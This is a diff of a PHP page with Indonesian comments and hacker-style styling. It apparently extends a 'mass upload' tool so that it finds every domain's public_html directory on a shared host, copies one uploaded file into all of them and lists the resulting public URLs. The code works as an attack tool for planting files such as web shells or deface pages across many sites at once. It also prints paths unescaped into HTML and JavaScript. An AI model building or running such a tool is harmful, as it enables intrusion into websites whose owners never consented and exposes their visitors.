@@ -8,7 +8,7 @@ function getCurrentDirectory() {
     return getcwd();
 }
 
-// Fungsi untuk mendapatkan daftar direktori
+// Fungsi untuk mendapatkan daftar direktori dengan menampilkan semua level
 function getDirectories($basePath, $depth = 1) {
     $directories = [];
     
@@ -35,13 +35,52 @@ function getDirectories($basePath, $depth = 1) {
     return $directories;
 }
 
+// Fungsi khusus untuk menampilkan direktori domains dan subdirektorinya
+function getDomainsDirectories($basePath) {
+    $directories = [];
+    
+    // Cek apakah direktori domains ada
+    $domainsPath = $basePath . '/domains';
+    if (is_dir($domainsPath)) {
+        $domains = scandir($domainsPath);
+        
+        foreach ($domains as $domain) {
+            if ($domain === '.' || $domain === '..') continue;
+            
+            $domainPath = $domainsPath . '/' . $domain;
+            
+            if (is_dir($domainPath)) {
+                // Tambahkan domain utama
+                $directories[] = [
+                    'name' => 'domains/' . $domain,
+                    'path' => $domainPath,
+                    'type' => 'domain'
+                ];
+                
+                // Cek public_html dalam domain
+                $publicHtmlPath = $domainPath . '/public_html';
+                if (is_dir($publicHtmlPath)) {
+                    $directories[] = [
+                        'name' => 'domains/' . $domain . '/public_html',
+                        'path' => $publicHtmlPath,
+                        'type' => 'public_html'
+                    ];
+                }
+            }
+        }
+    }
+    
+    return $directories;
+}
+
 // Fungsi untuk upload file ke multiple direktori
 function massUpload($sourceFile, $targetDirectories, $fileName) {
     $results = [];
     $uploadCount = 0;
     
-    foreach ($targetDirectories as $dir) {
-        $targetPath = $dir . '/' . $fileName;
+    foreach ($targetDirectories as $dirInfo) {
+        $dirPath = is_array($dirInfo) ? $dirInfo['path'] : $dirInfo;
+        $targetPath = $dirPath . '/' . $fileName;
         
         if (copy($sourceFile, $targetPath)) {
             $results[] = [
@@ -69,11 +108,26 @@ function massUpload($sourceFile, $targetDirectories, $fileName) {
 
 // Fungsi untuk mengubah path menjadi URL
 function getUrlFromPath($path) {
+    // Cari public_html dalam path
+    if (strpos($path, 'public_html') !== false) {
+        $parts = explode('public_html', $path);
+        if (count($parts) > 1) {
+            $webPath = ltrim($parts[1], '/');
+            
+            // Dapatkan domain dari path
+            $domainParts = explode('/', $parts[0]);
+            $domain = end($domainParts);
+            
+            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
+            return $protocol . "://" . $domain . "/" . $webPath;
+        }
+    }
+    
+    // Fallback ke method sebelumnya
     $basePath = getCurrentDirectory();
     $webPath = str_replace($basePath, '', $path);
     $webPath = ltrim($webPath, '/');
     
-    // Dapatkan domain saat ini
     $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
     $host = $_SERVER['HTTP_HOST'];
     
@@ -92,17 +146,32 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
     // Validasi depth
     $depth = max(1, min(5, $depth));
     
-    // Dapatkan direktori target
-    $directories = getDirectories($selectedPath, $depth);
-    
-    // Ekstrak semua path direktori
-    $targetDirs = [];
-    foreach ($directories as $dir) {
-        $targetDirs[] = $dir['path'];
-        // Jika depth > 1, tambahkan subdirektori juga
-        if ($depth > 1) {
-            foreach ($dir['subdirs'] as $subdir) {
-                $targetDirs[] = $subdir['path'];
+    // Dapatkan direktori target berdasarkan path yang dipilih
+    if (strpos($selectedPath, 'domains') !== false) {
+        // Jika memilih direktori domains, gunakan fungsi khusus
+        $targetDirs = [];
+        if (strpos($selectedPath, 'public_html') !== false) {
+            // Jika memilih public_html spesifik
+            $targetDirs[] = ['path' => $selectedPath];
+        } else {
+            // Jika memilih domain, cari semua public_html di dalamnya
+            $domains = getDomainsDirectories(dirname($selectedPath));
+            foreach ($domains as $domain) {
+                if ($domain['type'] === 'public_html') {
+                    $targetDirs[] = $domain;
+                }
+            }
+        }
+    } else {
+        // Untuk direktori biasa
+        $directories = getDirectories($selectedPath, $depth);
+        $targetDirs = [];
+        foreach ($directories as $dir) {
+            $targetDirs[] = $dir;
+            if ($depth > 1) {
+                foreach ($dir['subdirs'] as $subdir) {
+                    $targetDirs[] = $subdir;
+                }
             }
         }
     }
@@ -116,6 +185,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
 
 $currentDir = getCurrentDirectory();
 $baseDirs = getDirectories($currentDir, 1);
+$domainsDirs = getDomainsDirectories($currentDir);
 ?>
 
 <!DOCTYPE html>
@@ -167,7 +237,7 @@ $baseDirs = getDirectories($currentDir, 1);
         
         .dir-list {
             display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
             gap: 10px;
             margin: 20px 0;
         }
@@ -179,6 +249,7 @@ $baseDirs = getDirectories($currentDir, 1);
             border-radius: 5px;
             cursor: pointer;
             transition: all 0.3s;
+            font-size: 0.9rem;
         }
         
         .dir-item:hover {
@@ -189,6 +260,15 @@ $baseDirs = getDirectories($currentDir, 1);
         .dir-item.selected {
             background: rgba(0, 255, 0, 0.3);
             border-color: #ffff00;
+        }
+        
+        .dir-item.domain {
+            border-left: 4px solid #ff00ff;
+        }
+        
+        .dir-item.public_html {
+            border-left: 4px solid #ffff00;
+            background: rgba(255, 255, 0, 0.1);
         }
         
         .upload-form {
@@ -260,6 +340,7 @@ $baseDirs = getDirectories($currentDir, 1);
         .url-item {
             padding: 5px;
             border-bottom: 1px solid rgba(0, 255, 0, 0.2);
+            word-break: break-all;
         }
         
         @keyframes glow {
@@ -284,6 +365,13 @@ $baseDirs = getDirectories($currentDir, 1);
             border: 1px solid #00ff00;
             border-radius: 5px;
             background: rgba(0, 255, 0, 0.1);
+        }
+        
+        .section-title {
+            color: #ffff00;
+            margin: 15px 0 10px 0;
+            border-bottom: 1px solid #ffff00;
+            padding-bottom: 5px;
         }
     </style>
 </head>
@@ -322,10 +410,28 @@ $baseDirs = getDirectories($currentDir, 1);
         
         <div class="info-box">
             <h3>Pilih Direktori untuk Upload:</h3>
+            
+            <div class="section-title">📁 Direktori Domains</div>
+            <div class="dir-list">
+                <?php if (!empty($domainsDirs)): ?>
+                    <?php foreach ($domainsDirs as $dir): ?>
+                        <div class="dir-item <?php echo $dir['type']; ?>" 
+                             onclick="selectDirectory('<?php echo $dir['path']; ?>', '<?php echo $dir['name']; ?>')">
+                            📊 <?php echo $dir['name']; ?>
+                        </div>
+                    <?php endforeach; ?>
+                <?php else: ?>
+                    <div style="color: #ff0000; padding: 10px;">
+                        ❌ Direktori domains tidak ditemukan!
+                    </div>
+                <?php endif; ?>
+            </div>
+            
+            <div class="section-title">📂 Direktori Lainnya</div>
             <div class="dir-list">
                 <?php foreach ($baseDirs as $dir): ?>
-                    <div class="dir-item" onclick="selectDirectory('<?php echo $dir['path']; ?>')">
-                        <?php echo $dir['name']; ?>
+                    <div class="dir-item" onclick="selectDirectory('<?php echo $dir['path']; ?>', '<?php echo $dir['name']; ?>')">
+                        📁 <?php echo $dir['name']; ?>
                     </div>
                 <?php endforeach; ?>
             </div>
@@ -354,7 +460,7 @@ $baseDirs = getDirectories($currentDir, 1);
                     <?php foreach ($uploadResult['details'] as $result): ?>
                         <div class="url-item <?php echo $result['status']; ?>">
                             <?php if ($result['status'] === 'success'): ?>
-                                ✅ <a href="<?php echo $result['url']; ?>" target="_blank"><?php echo $result['url']; ?></a>
+                                ✅ <a href="<?php echo $result['url']; ?>" target="_blank" style="color: #00ff00;"><?php echo $result['url']; ?></a>
                             <?php else: ?>
                                 ❌ <?php echo $result['path']; ?> - <?php echo $result['error']; ?>
                             <?php endif; ?>
@@ -366,7 +472,7 @@ $baseDirs = getDirectories($currentDir, 1);
     </div>
 
     <script>
-        function selectDirectory(path) {
+        function selectDirectory(path, name) {
             document.getElementById('selected_path').value = path;
             
             // Update UI untuk menunjukkan direktori yang dipilih
@@ -378,8 +484,12 @@ $baseDirs = getDirectories($currentDir, 1);
             event.target.classList.add('selected');
             
             // Tampilkan alert dengan path yang dipilih
-            alert('Direktori dipilih: ' + path);
+            alert('Direktori dipilih: ' + name + '\nPath: ' + path);
         }
+        
+        // Debug info
+        console.log('Current directory: <?php echo $currentDir; ?>');
+        console.log('Domains directories:', <?php echo json_encode($domainsDirs); ?>);
     </script>
 </body>
 </html>
